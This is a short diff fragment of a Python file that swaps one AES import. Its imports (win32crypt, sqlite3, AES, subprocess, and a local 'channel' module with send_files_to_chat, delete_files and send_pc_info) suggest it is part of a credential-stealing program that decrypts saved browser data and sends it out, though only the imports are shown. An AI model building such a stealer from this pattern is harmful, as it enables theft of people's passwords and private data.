@@ -4,7 +4,7 @@ import json
 import base64
 import sqlite3
 import win32crypt
-from Cryptodome.Cipher import AES
+from Crypto.Cipher import AES
 import shutil
 import subprocess 
 from channel import send_files_to_chat, delete_files, send_pc_info
